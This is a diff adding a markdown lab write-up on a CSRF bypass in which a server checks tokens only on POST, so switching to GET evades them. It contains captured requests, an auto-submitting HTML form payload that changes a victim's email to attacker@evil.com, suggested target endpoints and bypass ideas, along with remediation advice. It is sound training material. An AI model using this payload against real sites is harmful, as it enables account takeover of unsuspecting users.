@@ -1,4 +1,4 @@
-# 🐞 Lab — CSRF → Change Email (No CSRF Token)
+# 🐞 Lab-1 — CSRF → Change Email (No CSRF Token)
 
 ---
 
@@ -449,3 +449,439 @@ Action executed as victim
 ---
 
 CSRF = forcing trusted actions through the victim’s browser
+
+---
+
+# 🐞 Lab-2 — CSRF → POST to GET Bypass (Email Change)
+
+---
+
+## 🧠 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates a **CSRF bypass** where protection exists but is improperly enforced.
+
+---
+
+Normally:
+
+CSRF tokens protect sensitive actions.
+
+---
+
+However, in this lab:
+
+The server validates CSRF **only for POST requests** and ignores it for GET.
+
+---
+
+👉 This creates a bypass where attacker can switch method and remove token.
+
+---
+
+## 🧠 🟦 Core Idea
+
+If CSRF is enforced only on POST → switching to GET bypasses protection
+
+---
+
+## 🧠 🟥 Key Exploit
+
+```
+GET /my-account/change-email?email=attacker@evil.com
+```
+
+---
+
+👉 No CSRF token required → request succeeds
+
+---
+
+## 🔍 🧠 What Is This Topic?
+
+### 🔹 CSRF Method Bypass
+
+A flaw where CSRF validation depends on HTTP method instead of enforcing protection universally
+
+---
+
+## 🧪 🟩 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture POST Request
+
+```
+POST /my-account/change-email HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+email=test@x.com&csrf=RANDOM_TOKEN
+```
+
+---
+
+![post-with-csrf](../images/post-with-csrf.png)
+
+---
+
+### 🧠 Observation
+
+```
+CSRF token is present
+```
+
+---
+
+### 🧩 Step 2 — Test CSRF Validation
+
+Modify token:
+
+```
+email=test@x.com&csrf=INVALID
+```
+
+---
+
+👉 Result:
+
+```
+Invalid CSRF token
+```
+
+---
+
+![invalid-csrf](../images/invalid-csrf.png)
+
+---
+
+### 🧠 Conclusion
+
+```
+CSRF protection exists (for POST)
+```
+
+---
+
+### 🧩 Step 3 — Change POST → GET
+
+```
+GET /my-account/change-email?email=test@x.com&csrf=RANDOM_TOKEN
+```
+
+---
+
+Remove request body completely
+
+---
+
+### 🧩 Step 4 — Observe Behavior
+
+```
+GET /my-account/change-email?email=test@x.com
+```
+
+---
+
+👉 Result:
+
+✔ Request succeeds  
+✔ CSRF token ignored  
+
+---
+
+![get-bypass](../images/get-bypass.png)
+
+---
+
+### 🧠 Vulnerability Confirmed
+
+```
+CSRF validation is bypassed via GET method
+```
+
+---
+
+### 🧩 Step 5 — Build CSRF Exploit
+
+```
+<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+### 🧩 Step 6 — Deliver Exploit
+
+```
+Host on exploit server
+Victim loads page
+```
+
+---
+
+👉 Browser sends GET request automatically
+
+---
+
+### 🧩 Step 7 — Result
+
+```
+Email changed without CSRF validation
+```
+
+---
+
+## 💣 🟨 Payload Breakdown (Easy)
+
+---
+
+### 🔹 GET Request
+
+```
+/my-account/change-email?email=attacker@evil.com
+```
+
+---
+
+### 🔹 Form
+
+```
+<form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
+```
+
+---
+
+### 🔹 Hidden Input
+
+```
+<input type="hidden" name="email" value="attacker@evil.com">
+```
+
+---
+
+### 🔹 Auto Submit
+
+```
+<script>
+document.forms[0].submit();
+</script>
+```
+
+---
+
+## 🌍 🟥 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking Apps
+
+```
+POST protected
+GET unprotected → money transfer
+```
+
+---
+
+### 🔥 Scenario 2 — Account Takeover
+
+```
+Change email via GET
+→ reset password
+```
+
+---
+
+### 🔥 Scenario 3 — Admin Panels
+
+```
+POST protected
+GET adds admin user
+```
+
+---
+
+### 🔥 Scenario 4 — API Misconfig
+
+```
+Same endpoint supports GET + POST
+Only POST validated
+```
+
+---
+
+## ⚔️ 🧠 Attack Chain
+
+---
+
+1️⃣ Capture request  
+2️⃣ Identify CSRF token  
+3️⃣ Test invalid token  
+4️⃣ Switch POST → GET  
+5️⃣ Remove CSRF token  
+6️⃣ Confirm bypass  
+7️⃣ Build exploit page  
+8️⃣ Deliver to victim  
+9️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+### 🔹 Account Actions
+
+```
+/my-account/change-email
+/change-password
+```
+
+---
+
+### 🔹 Financial
+
+```
+/transfer-money
+```
+
+---
+
+### 🔹 Admin
+
+```
+/add-admin
+```
+
+---
+
+### 🔹 APIs
+
+```
+/api/update-profile
+```
+
+---
+
+## ⚠️ 🟥 Real-World Limitations + Bypass
+
+---
+
+### ❌ GET Not Supported
+
+👉 No bypass possible
+
+---
+
+### ❌ CSRF Validated on All Methods
+
+👉 Attack fails
+
+---
+
+### ❌ SameSite Cookies
+
+👉 Cookies blocked
+
+---
+
+### ❌ Origin / Referer Check
+
+👉 Request rejected
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Try alternate HTTP methods
+Check hidden GET endpoints
+Look for inconsistent validation
+```
+
+---
+
+## 🛡️ 🔒 Remediation
+
+---
+
+### 🔴 Root Problem
+
+CSRF validation applied only to POST
+
+---
+
+### ✅ Fix 1 — Enforce CSRF on ALL Methods
+
+```
+Validate token for GET + POST + others
+```
+
+---
+
+### ✅ Fix 2 — Disallow State Change via GET
+
+```
+GET should be read-only
+```
+
+---
+
+### ✅ Fix 3 — Validate Origin / Referer
+
+```
+Reject cross-site requests
+```
+
+---
+
+### ✅ Fix 4 — Use SameSite Cookies
+
+```
+SameSite=Strict
+```
+
+---
+
+### ✅ Fix 5 — Re-authentication
+
+```
+Require password for sensitive changes
+```
+
+---
+
+## 🧠 🟪 Mental Model
+
+---
+
+POST = protected  
+
+GET = often forgotten  
+
+---
+
+If one method is weak → entire protection fails  
+
+---
+
+## 🎯 🧠 Final Summary
+
+---
+
+✔ CSRF token exists but is incomplete  
+
+✔ Switching method bypasses protection  
+
+✔ GET request executes without validation  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+CSRF protection on POST only = instant bypass via GET
